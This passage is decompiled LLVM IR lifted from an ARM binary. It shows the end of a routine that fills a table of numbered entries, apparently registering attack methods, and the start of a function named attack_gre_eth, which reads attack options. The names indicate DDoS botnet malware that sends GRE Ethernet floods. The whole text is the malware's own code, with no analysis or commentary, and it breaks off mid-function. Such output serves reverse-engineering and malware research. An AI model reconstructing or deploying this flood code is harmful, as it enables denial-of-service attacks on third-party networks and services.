  store i32 ptrtoint (i32* @global_var_bd94.40 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.40 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_22424.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.42 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.42 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.44 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_22424.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.44 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.44 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_22424.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.46 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.46 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.48 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_22424.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.48 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.48 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.50 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_22424.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.50 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.50 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_22424.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_22424.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.53 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.53 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_22424.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.55 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.55 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.57 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_22424.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.57 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.57 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22420.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_22421.38 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_22420.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22420.29 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
  %v6_8a04 = inttoptr i32 %v0_89f8 to i32*
